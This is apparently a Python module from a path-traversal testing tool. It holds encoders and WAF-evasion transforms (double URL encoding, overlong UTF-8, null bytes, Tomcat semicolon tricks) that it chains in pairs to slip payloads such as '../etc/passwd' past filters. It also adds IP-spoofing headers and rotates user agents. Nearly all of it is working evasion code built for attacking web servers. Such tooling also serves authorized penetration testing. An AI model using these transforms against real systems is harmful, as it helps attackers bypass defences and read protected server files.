"""Compositional WAF bypass — encoders are functions ``str → str``.

Encoders compose: ``double_url(url_encode(payload))``.  The engine
applies individual transforms AND chained combinations, replacing the
v2 approach where transforms were never combined.
"""

from __future__ import annotations

import random
from typing import Callable, Dict, List, Tuple

from pathprobe.core.config import SPOOF_HEADERS, USER_AGENTS


# ─────────────────────────────────────────────
#  Encoder primitives  (str → str)
# ─────────────────────────────────────────────

def _url_encode_dots_slashes(s: str) -> str:
    """URL-encode dots and path separators."""
    return s.replace(".", "%2e").replace("/", "%2f").replace("\\", "%5c")


def _double_url_encode(s: str) -> str:
    """Double URL-encode dots and path separators."""
    return s.replace(".", "%252e").replace("/", "%252f").replace("\\", "%255c")


def _unicode_c0(s: str) -> str:
    """Overlong UTF-8 encoding for forward slash."""
    return s.replace("/", "%c0%af").replace(".", "%c0%ae")


def _unicode_fullwidth(s: str) -> str:
    """Unicode fullwidth slash (U+FF0F)."""
    return s.replace("/", "%ef%bc%8f")


def _unicode_u_notation(s: str) -> str:
    """IIS %u notation for slash."""
    return s.replace("/", "%u2215").replace("\\", "%u005c")


def _mixed_dot_encode(s: str) -> str:
    """Encode only one of the two dots in ``..``."""
    return s.replace("../", ".%2e/").replace("..\\", ".%2e\\")


def _dot_first_encode(s: str) -> str:
    """Encode the first dot only in ``..``."""
    return s.replace("../", "%2e./").replace("..\\", "%2e.\\")


def _identity(s: str) -> str:
    return s


# ─────────────────────────────────────────────
#  WAF transform primitives
# ─────────────────────────────────────────────

def _case_variation(s: str) -> str:
    """Randomise casing on file-name segments."""
    out = []
    for ch in s:
        if ch.isalpha() and random.random() > 0.5:
            out.append(ch.swapcase())
        else:
            out.append(ch)
    return "".join(out)


def _insert_null(s: str) -> str:
    return s.replace("../", "..%00/").replace("..\\", "..%00\\")


def _path_comment(s: str) -> str:
    """Insert tab characters to break WAF pattern matching."""
    return s.replace("../", ".%09./").replace("/etc/", "/%09etc/")


def _tab_newline(s: str) -> str:
    return s.replace("/", "%09/").replace("../", "..%0a/")


def _double_slash(s: str) -> str:
    return s.replace("../", ".././").replace("/etc/", "//etc//")


def _semicolon_bypass(s: str) -> str:
    """Tomcat/Jetty path-parameter bypass: ``..;/`` normalises to ``../``."""
    return s.replace("../", "..;/").replace("..\\", "..;\\")


def _hash_bypass(s: str) -> str:
    """Use ``%23`` (``#``) as fragment fake-out."""
    return s.replace("../", "../%23/../")


def _utf8_overlong_dot(s: str) -> str:
    """Overlong UTF-8 for dot only."""
    return s.replace(".", "%c0%ae")


# ─────────────────────────────────────────────
#  Registry
# ─────────────────────────────────────────────

ENCODERS: Dict[str, Callable[[str], str]] = {
    "none":              _identity,
    "url":               _url_encode_dots_slashes,
    "double_url":        _double_url_encode,
    "unicode_c0":        _unicode_c0,
    "unicode_fullwidth": _unicode_fullwidth,
    "unicode_u":         _unicode_u_notation,
    "mixed_dot":         _mixed_dot_encode,
    "dot_first":         _dot_first_encode,
}

WAF_TRANSFORMS: Dict[str, Callable[[str], str]] = {
    "case_variation":    _case_variation,
    "insert_null":       _insert_null,
    "path_comment":      _path_comment,
    "tab_newline":       _tab_newline,
    "double_slash":      _double_slash,
    "semicolon":         _semicolon_bypass,
    "hash_bypass":       _hash_bypass,
    "overlong_dot":      _utf8_overlong_dot,
}


# ─────────────────────────────────────────────
#  Composition helpers
# ─────────────────────────────────────────────

def compose(*fns: Callable[[str], str]) -> Callable[[str], str]:
    """Return a function that applies *fns* left-to-right.

    >>> composed = compose(url_encode, insert_null)
    >>> composed("../etc/passwd")
    """
    def _composed(s: str) -> str:
        for fn in fns:
            s = fn(s)
        return s
    return _composed


def apply_encoding(payload: str, encoding: str) -> str:
    """Apply a named encoder to *payload*.  Returns unchanged if unknown."""
    return ENCODERS.get(encoding, _identity)(payload)


def apply_waf_transforms(
    payload: str,
    techniques: List[str],
) -> List[Tuple[str, str]]:
    """Apply each WAF technique individually and return ``(tech_name, mutated)``.

    If ``'all'`` is in *techniques*, every known transform is applied.
    Duplicates (where the transform has no effect) are dropped.
    """
    if "all" in techniques:
        techniques = list(WAF_TRANSFORMS.keys())

    results: List[Tuple[str, str]] = []
    for tech in techniques:
        fn = WAF_TRANSFORMS.get(tech)
        if fn is None:
            continue
        mutated = fn(payload)
        if mutated != payload:
            results.append((tech, mutated))
    return results


def apply_chained_waf_transforms(
    payload: str,
    techniques: List[str],
    max_chain_depth: int = 2,
) -> List[Tuple[str, str]]:
    """Apply *combinations* of WAF transforms (up to *max_chain_depth* deep).

    This is the key improvement over v2 which only applied transforms
    individually.  For depth=2, we combine every pair; for depth=3,
    every triple.  Practical testing rarely needs depth > 2.
    """
    if "all" in techniques:
        techniques = list(WAF_TRANSFORMS.keys())

    fns = [(t, WAF_TRANSFORMS[t]) for t in techniques if t in WAF_TRANSFORMS]
    results: List[Tuple[str, str]] = []
    seen = {payload}

    # Depth 1 (individual)
    for name, fn in fns:
        m = fn(payload)
        if m not in seen:
            seen.add(m)
            results.append((name, m))

    # Depth 2 (pairs)
    if max_chain_depth >= 2:
        for n1, f1 in fns:
            for n2, f2 in fns:
                if n1 == n2:
                    continue
                m = f2(f1(payload))
                if m not in seen:
                    seen.add(m)
                    results.append((f"{n1}+{n2}", m))

    return results


# ─────────────────────────────────────────────
#  Header helpers
# ─────────────────────────────────────────────

def spoof_ip_headers(headers: Dict[str, str]) -> Dict[str, str]:
    """Merge IP-spoofing headers into *headers*."""
    merged = dict(headers)
    merged.update(SPOOF_HEADERS)
    return merged


def random_user_agent() -> str:
    return random.choice(USER_AGENTS)
